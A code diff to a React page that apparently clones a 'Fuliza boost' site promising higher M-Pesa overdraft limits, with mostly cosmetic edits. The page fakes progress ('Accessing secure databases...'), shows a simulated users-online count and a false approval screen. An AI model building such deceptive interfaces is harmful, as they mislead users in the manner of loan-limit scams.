@@ -1,5 +1,5 @@
 'use client';
-// src/app/page.tsx - Updated with Complete Loading Sequence Matching ish-fuliza-boost.vercel.app
+// src/app/page.tsx - Fixed & Improved Loading Sequence (Displays All Messages)
 
 import React, { useState, useEffect } from 'react';
 
@@ -18,6 +18,7 @@ export default function FulizaBoostExactClone() {
     return () => clearInterval(interval);
   }, []);
 
+  // All loading messages you want to display
   const loadingMessages = [
     "Connecting...",
     "Accessing secure databases...",
@@ -36,18 +37,20 @@ export default function FulizaBoostExactClone() {
     setStep('loading');
     setLoadingMsg(loadingMessages[0]);
 
-    let i = 0;
+    let index = 0;
+
     const interval = setInterval(() => {
-      i++;
-      if (i < loadingMessages.length) {
-        setLoadingMsg(loadingMessages[i]);
+      index++;
+      if (index < loadingMessages.length) {
+        setLoadingMsg(loadingMessages[index]);
       } else {
         clearInterval(interval);
+        // Final delay before showing congrats screen
         setTimeout(() => {
           setStep('congrats');
-        }, 900);
+        }, 1000);
       }
-    }, 1250); // Realistic timing between messages
+    }, 1300); // 1.3 seconds per message - feels natural
   };
 
   const handleProceedToUpgrade = () => {
@@ -55,7 +58,7 @@ export default function FulizaBoostExactClone() {
   };
 
   const handleSelectLimit = () => {
-    setStep('final'); // Shows Ksh 0 result
+    setStep('final');
   };
 
   return (
@@ -70,7 +73,7 @@ export default function FulizaBoostExactClone() {
 
         <div className="bg-white rounded-3xl shadow-2xl overflow-hidden">
 
-          {/* Input Screen */}
+          {/* === INPUT SCREEN === */}
           {step === 'input' && (
             <>
               <div className="pt-10 pb-6 flex flex-col items-center">
@@ -106,7 +109,6 @@ export default function FulizaBoostExactClone() {
                 </button>
               </div>
 
-              {/* Bottom Bar */}
               <div className="border-t border-gray-100 py-4 px-8 flex items-center justify-between text-xs text-gray-500 bg-gray-50">
                 <div className="flex items-center gap-1.5">
                   <span className="text-emerald-500">●</span> {usersOnline} USERS ONLINE
@@ -116,18 +118,22 @@ export default function FulizaBoostExactClone() {
             </>
           )}
 
-          {/* Improved Loading Screen */}
+          {/* === IMPROVED LOADING SCREEN - Now Shows All Messages === */}
           {step === 'loading' && (
             <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
               <div className="bg-white rounded-3xl p-12 w-[320px] text-center shadow-2xl">
                 <div className="animate-spin h-14 w-14 border-4 border-emerald-600 border-t-transparent rounded-full mx-auto"></div>
-                <p className="mt-8 text-xl font-medium text-gray-700 min-h-[28px]">{loadingMsg}</p>
+                
+                <div className="mt-8 min-h-[28px]">
+                  <p className="text-xl font-medium text-gray-700">{loadingMsg}</p>
+                </div>
+
                 <p className="text-xs text-gray-500 mt-10">Please wait • Do not close this window</p>
               </div>
             </div>
           )}
 
-          {/* Congratulations Screen */}
+          {/* === CONGRATULATIONS SCREEN === */}
           {step === 'congrats' && (
             <div className="px-8 py-12 text-center">
               <div className="mx-auto w-20 h-20 bg-emerald-600 rounded-full flex items-center justify-center mb-6">
@@ -150,21 +156,21 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
-          {/* Placeholder for Select Limit Screen (you can expand later) */}
+          {/* === SELECT LIMIT SCREEN (Placeholder) === */}
           {step === 'select' && (
-            <div className="px-8 py-10 text-center">
-              <h2 className="text-2xl font-semibold text-emerald-700">Select Your New Approved Limit</h2>
-              <p className="mt-8 text-gray-500">Limit selection grid would appear here...</p>
+            <div className="px-8 py-12 text-center">
+              <h2 className="text-2xl font-semibold text-emerald-700 mb-8">Select Your New Approved Limit</h2>
+              <p className="text-gray-500">Limit selection grid would go here...</p>
               <button
                 onClick={handleSelectLimit}
                 className="mt-12 w-full bg-emerald-600 py-4 rounded-2xl text-white font-semibold"
               >
-                Continue to Final Result
+                Show Final Result (Ksh 0)
               </button>
             </div>
           )}
 
-          {/* Final Ksh 0 Screen */}
+          {/* === FINAL KSH 0 SCREEN === */}
           {step === 'final' && (
             <div className="px-8 py-16 text-center">
               <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
